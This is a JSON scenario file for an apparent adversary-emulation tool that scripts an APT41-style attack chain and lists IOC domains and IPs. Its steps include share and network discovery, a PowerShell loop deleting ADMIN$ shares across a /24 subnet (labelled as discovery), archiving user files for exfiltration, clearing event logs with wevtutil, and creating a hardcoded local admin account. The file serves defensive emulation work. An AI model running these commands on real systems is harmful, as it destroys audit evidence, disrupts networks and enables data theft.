@@ -1,0 +1,607 @@
+{
+    "meta_data": {
+        "name": "apt41",
+        "version": "v1.0.5",
+        "title": "APT-41 Inspired Scenario 1",
+        "description": "Inspired by APT41. An automated attack meant to emulate an APT actor with the common names WICKED PANDA and APT41. The attack attempts to exfiltrate victim\u2019s data through C2 channels and alternative protocols.",
+        "author": "Attack Content",
+        "suggested_duration": 2441
+    },
+    "procedures": [
+        {
+            "tactic": "Actuator",
+            "technique": "Infrastructure",
+            "label": "actuator",
+            "preconditions": {
+                "tool": "self.tool_name"
+            }
+        },
+        {
+            "tactic": "Interfaces",
+            "technique": "Infrastructure",
+            "label": "Interfaces",
+            "preconditions": {
+                "tool": "self.tool",
+                "exfil": "self.exfil",
+                "driveby": "self.driveby"
+            }
+        },
+        {
+            "tactic": "DNS",
+            "technique": "Infrastructure",
+            "label": "DNS",
+            "preconditions": {
+                "tool": "self.tool",
+                "exfil": "self.exfil",
+                "driveby": "self.driveby"
+            }
+        },
+        {
+            "tactic": "NGINX",
+            "technique": "Infrastructure",
+            "label": "NGINX",
+            "preconditions": {
+                "self.tool_name": "self.tool",
+                "payload": "self.payload_name",
+                "exfiltration": "self.exfil",
+                "driveby": "self.driveby",
+                "driveby_ctl": "self.chimera"
+            }
+        },
+        {
+            "tactic": "PayloadCheapride",
+            "technique": "Infrastructure",
+            "label": "Payload",
+            "preconditions": {
+                "tool": "self.tool"
+            }
+        },
+        {
+            "tactic": "DriveByCompromise",
+            "technique": "InitialAccess",
+            "label": "driveByCompromise",
+            "preconditions": {
+                "actuator": "self.actuator",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "UserExecution",
+            "technique": "Execution",
+            "label": "userExecution",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "WebProtocols",
+            "technique": "c2",
+            "label": "webProtocols_1",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1",
+                "tune": {
+                    "infra": true
+                }
+            }
+        },
+        {
+            "tactic": "SystemNetworkConfigurationDiscovery",
+            "technique": "Discovery",
+            "label": "systemNetworkConfigurationDiscovery_t1_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "getmac"
+                }
+            }
+        },
+        {
+            "tactic": "SystemNetworkConnectionsDiscovery",
+            "technique": "Discovery",
+            "label": "systemNetworkConnectionsDiscovery_t1_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "netstat -an"
+                }
+            }
+        },
+        {
+            "tactic": "SystemOwnerUserDiscovery",
+            "technique": "Discovery",
+            "label": "systemOwnerUserDiscovery_t1_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "wmic computersystem get username"
+                }
+            }
+        },
+        {
+            "tactic": "NetworkShareDiscovery",
+            "technique": "Discovery",
+            "label": "networkShareDiscovery_t1_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "net share"
+                }
+            }
+        },
+        {
+            "tactic": "NetworkShareDiscovery",
+            "technique": "Discovery",
+            "label": "networkShareDiscovery_t1_2",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell &{$network=\"{target_network_slash_24}\"; $range=(1..254); $ErrorActionPreference=\"silentlycontinue\"; Foreach ($add in $range) {net.exe share, ADMIN$, \"\\\\$network.$add\", /delete}; echo \" \" }"
+                }
+            }
+        },
+        {
+            "tactic": "SystemNetworkConfigurationDiscovery",
+            "technique": "Discovery",
+            "label": "systemNetworkConfigurationDiscovery_t1_2",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "arp -a"
+                }
+            }
+        },
+        {
+            "tactic": "ArchiveViaUtility",
+            "technique": "Collection",
+            "label": "archiveViaUtility_t1_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell &{$files = @(); gci c:\\\\users -exclude \"Public\" | gci -Recurse -exclude \"AppData,\",\"*.lnk\",\"*.url\" -file 2>$null | foreach {$files = $files + $_.FullName};$file = $files | Get-Random; Compress-Archive -Path $file -DestinationPath \"C:\\file.zip\"; echo $file}"
+                }
+            }
+        },
+        {
+            "tactic": "ExfiltrationOverWebService",
+            "technique": "Exfiltration",
+            "label": "exfiltrationOverWebService_t1_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "exfil": "self.exfil",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "ExfiltrationOverUnencryptedObfuscatedNonC2Protocol",
+            "technique": "Exfiltration",
+            "label": "exfiltrationOverUnencryptedObfuscatedNonC2Protocol_t1_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "exfil": "self.exfil",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "WindowsService",
+            "technique": "Persistence",
+            "label": "windowsService_t1_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "ServiceExecution",
+            "technique": "Execution",
+            "label": "serviceExecution_t1_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "RemoteServices_NetUse",
+            "technique": "LateralMovement",
+            "label": "remoteServices_netuse_t1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target_1": "self.target_1",
+                "target_2": "self.target_2"
+            }
+        },
+        {
+            "tactic": "RemoteFileCopy_PowerShellWebClient",
+            "technique": "LateralMovement",
+            "label": "remoteServices_filecopy_t1_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target_1": "self.target_1",
+                "target_2": "self.target_2"
+            }
+        },
+        {
+            "tactic": "ScheduledTask",
+            "technique": "LateralMovement",
+            "label": "scheduled_task_t1_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target_1": "self.target_1",
+                "target_2": "self.target_2"
+            }
+        },
+        {
+            "tactic": "WindowsManagementInstrumentation",
+            "technique": "Execution",
+            "label": "windowsManagementInstrumentation_t1_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target_1": "self.target_1",
+                "target_2": "self.target_2"
+            }
+        },
+        {
+            "tactic": "WebProtocols",
+            "technique": "c2",
+            "label": "webProtocols_2",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_2",
+                "tune": {
+                    "infra": true
+                }
+            }
+        },
+        {
+            "tactic": "ClearWindowsEventLogs",
+            "technique": "DefenseEvasion",
+            "label": "clearWindowsEventLogs_t1_1",
+            "preconditions": {
+                "agent": "self.agent_tgt2",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "wevtutil clear-log system /r:",
+                            "self.target_1_hostname"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "ClearWindowsEventLogs",
+            "technique": "DefenseEvasion",
+            "label": "clearWindowsEventLogs_t1_2",
+            "preconditions": {
+                "agent": "self.agent_tgt2",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "wevtutil clear-log security /r:",
+                            "self.target_1_hostname"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "FileDeletion",
+            "technique": "DefenseEvasion",
+            "label": "fileDeletion_t1_1",
+            "preconditions": {
+                "agent": "self.agent_tgt2",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell &{del C:\\file.zip; echo ' '}"
+                }
+            }
+        },
+        {
+            "tactic": "CreateAccount_LocalAccount",
+            "technique": "Persistence",
+            "label": "createAccount_LocalAccount_t2",
+            "preconditions": {
+                "agent": "self.agent_tgt2",
+                "tool": "self.tool",
+                "target": "self.target_2",
+                "tune": {
+                    "tmp_local_admin_username": "apt41-user",
+                    "tmp_local_admin_password": "Secure123String"
+                }
+            }
+        },
+        {
+            "tactic": "AccountManipulation",
+            "technique": "Persistence",
+            "label": "accountManipulation_t2",
+            "preconditions": {
+                "agent": "self.agent_tgt2",
+                "tool": "self.tool",
+                "target": "self.target_2",
+                "tune": {
+                    "tmp_local_admin_username": "apt41-user"
+                }
+            }
+        },
+        {
+            "tactic": "AgentExit",
+            "technique": "Utility",
+            "label": "AgentExit",
+            "preconditions": {
+                "agent": "self.agent_tgt2",
+                "tool": "self.tool",
+                "target": "self.target_2"
+            }
+        },
+        {
+            "tactic": "AgentExit",
+            "technique": "Utility",
+            "label": "AgentExit",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        }
+    ],
+    "iocs": {
+        "domain": [
+            "notped.com",
+            "dnsgogle.com",
+            "operatingbox.com",
+            "paniesx.com",
+            "techniciantext.com",
+            "agegamepay.com",
+            "ageofwuxia.com",
+            "ageofwuxia.info",
+            "ageofwuxia.net",
+            "ageofwuxia.org",
+            "bugcheck.xigncodeservice.com",
+            "byeserver.com",
+            "gamewushu.com",
+            "gxxservice.com",
+            "ibmupdate.com",
+            "infestexe.com",
+            "kasparsky.net",
+            "linux-update.net",
+            "macfee.ga",
+            "micros0ff.com",
+            "micros0tf.com",
+            "serverbye.com",
+            "sexyjapan.ddns.info",
+            "symanteclabs.com",
+            "win7update.net",
+            "xigncodeservice.com"
+        ],
+        "ip": [
+            "64.190.63.111/24",
+            "64.190.64.111/24",
+            "64.190.63.114/24",
+            "64.191.63.114/24",
+            "64.190.63.98/24",
+            "3.19.116.195/24",
+            "3.18.7.81/24",
+            "3.19.14.82/24",
+            "58.158.177.112/24",
+            "129.42.38.1/24",
+            "58.158.177.104/24",
+            "204.16.169.54/24",
+            "18.117.28.81/24",
+            "3.19.100.43/24",
+            "3.13.90.76/24"
+        ],
+        "binary": [
+            "Documents.7z.exe",
+            "FairWin.exe",
+            "DrvDll.exe",
+            "PlusDll.exe"
+        ],
+        "service": [
+            "StorSyncSvc",
+            "StorSvcSync",
+            "SyncStorSvc"
+        ],
+        "taskname": [
+            "StorageUpdater",
+            "Stor_back_update",
+            "StorageSync"
+        ]
+    },
+    "spec": {
+        "emaillist": "@('Janice Durham <janice.durham@site.com>', 'Darryl Richmond <darryl.richmond@site.com>', 'Nelda Rios <nelda.rios@site.com>', 'Joanna Wilkerson <joanna.wilkerson@site.com>')",
+        "tool": {
+            "1": {
+                "name": "cheapride_v1",
+                "beacon": "45",
+                "jitter": "75",
+                "ioc-ip_callback": "122.49.200.108/24",
+                "ioc-domain_callback": "inf0rm.bed1rcati.com",
+                "ioc-binary_payload_name": "form.doc.exe"
+            }
+        },
+        "chimera": {
+            "api-control_ip": "10.10.200.60"
+        },
+        "exfil": {
+            "1": {
+                "ioc-ip_exfil": "161.135.1.25/24",
+                "ioc-domain_exfil": "deepwaterhorizon.com"
+            }
+        },
+        "driveby": {
+            "1": {
+                "ioc-ip_driveby": "161.135.1.22/24",
+                "ioc-domain_driveby": "texaspumps.us"
+            }
+        },
+        "targets": {
+            "1": {
+                "query-exfil_files": [
+                    "C:\\file.zip",
+                    "C:\\file.zip"
+                ],
+                "payload_destination": "c:\\users\\Public\\",
+                "ioc-service": "StorSyncSvc"
+            },
+            "2": {
+                "payload_destination": "c:\\users\\Public"
+            },
+            "3": {
+                "payload_destination": "C:\\PerfLogs",
+                "ioc-taskname": {
+                    "template": [
+                        {
+                            "kind": "name",
+                            "id": "scenario_name"
+                        },
+                        "_",
+                        {
+                            "kind": "call",
+                            "func": {
+                                "kind": "name",
+                                "id": "time"
+                            },
+                            "args": []
+                        }
+                    ]
+                }
+            }
+        }
+    },
+    "preconditions": {
+        "state": {},
+        "initial": {
+            "tool_name": {
+                "path": [
+                    "tool",
+                    "1",
+                    "name"
+                ]
+            },
+            "payload_name": {
+                "path": [
+                    "tool",
+                    "1",
+                    "ioc-binary_payload_name"
+                ]
+            },
+            "tool": {
+                "path": [
+                    "tool",
+                    "1"
+                ]
+            },
+            "exfil": {
+                "path": [
+                    "exfil",
+                    "1"
+                ]
+            },
+            "driveby": {
+                "path": [
+                    "driveby",
+                    "1"
+                ]
+            },
+            "driveby_domain": {
+                "path": [
+                    "driveby",
+                    "1",
+                    "ioc-domain_driveby"
+                ]
+            },
+            "chimera": {
+                "path": [
+                    "chimera"
+                ]
+            },
+            "target_1": {
+                "path": [
+                    "targets",
+                    "1"
+                ]
+            },
+            "target_1_hostname": {
+                "path": [
+                    "targets",
+                    "1",
+                    "query_target_hostname"
+                ]
+            },
+            "target_2": {
+                "path": [
+                    "targets",
+                    "2"
+                ]
+            }
+        },
+        "effects": {
+            "actuator": {
+                "path": [
+                    "actuator",
+                    "actuator",
+                    "ret",
+                    "registered_id"
+                ],
+                "default": 0
+            },
+            "scenario_infrastructure": {
+                "path": [
+                    "infrastructure"
+                ]
+            },
+            "agent_tgt1": {
+                "path": [
+                    "webProtocols_1",
+                    "agent",
+                    "ret",
+                    "agent_id"
+                ]
+            },
+            "agent_tgt2": {
+                "path": [
+                    "webProtocols_2",
+                    "agent",
+                    "ret",
+                    "agent_id"
+                ]
+            }
+        }
+    }
+}
